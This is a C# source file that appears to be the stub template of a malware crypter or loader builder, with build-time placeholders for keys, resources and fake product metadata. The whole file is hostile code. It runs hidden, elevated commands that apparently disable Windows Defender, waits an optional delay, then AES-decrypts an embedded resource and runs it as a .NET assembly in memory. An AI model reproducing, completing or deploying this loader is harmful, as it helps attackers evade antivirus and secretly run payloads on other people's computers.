using System;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Resources;
using System.Threading;
using System.Diagnostics;
using System.Runtime.InteropServices;
#if DefDebug
using System.Windows.Forms;
#endif

#if DefAssembly
[assembly: AssemblyTitle("%Title%")]
[assembly: AssemblyDescription("%Description%")]
[assembly: AssemblyCompany("%Company%")]
[assembly: AssemblyProduct("%Product%")]
[assembly: AssemblyCopyright("%Copyright%")]
[assembly: AssemblyTrademark("%Trademark%")]
[assembly: AssemblyFileVersion("%v1%" + "." + "%v2%" + "." + "%v3%" + "." + "%v4%")]
[assembly: Guid("%Guid%")]
#endif

public partial class Loader
{
    public static void Main()
    {

#if DefKillWD
        try
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = "cmd",
                Arguments = "/c " + Encoding.ASCII.GetString(RAES_Decryptor(Convert.FromBase64String("#KillWDCommands"))) + " & exit",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                Verb = "runas"
            });
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("L1: " + Environment.NewLine + ex.ToString());
#endif
        }
#endif

        try
        {
            int startDelay = 0;
            if (int.TryParse("#STARTDELAY", out startDelay) && startDelay > 0)
            {
                Thread.Sleep(startDelay * 1000);
            }
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("L2: " + Environment.NewLine + ex.ToString());
#endif
        }

        try
        {
            Assembly.Load(RAES_Decryptor((byte[])new ResourceManager("#LoaderRes", Assembly.GetExecutingAssembly()).GetObject("#Program"))).CreateInstance("Program").GetType().GetMethod("Main").Invoke(null, new object[0]);
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("L3: " + Environment.NewLine + ex.ToString());
#endif
        }
    }

    public static byte[] RAES_Decryptor(byte[] rarg1)
    {
        using (var mStream = new MemoryStream())
        {
            using (var cStream = new CryptoStream(mStream, new RijndaelManaged().CreateDecryptor(new Rfc2898DeriveBytes("#KEY", Encoding.ASCII.GetBytes("#SALT"), 100).GetBytes(16), Encoding.ASCII.GetBytes("#IV")), CryptoStreamMode.Write))
            {
                cStream.Write(rarg1, 0, rarg1.Length);
                cStream.Close();
            }
            return mStream.ToArray();
        }
    }
}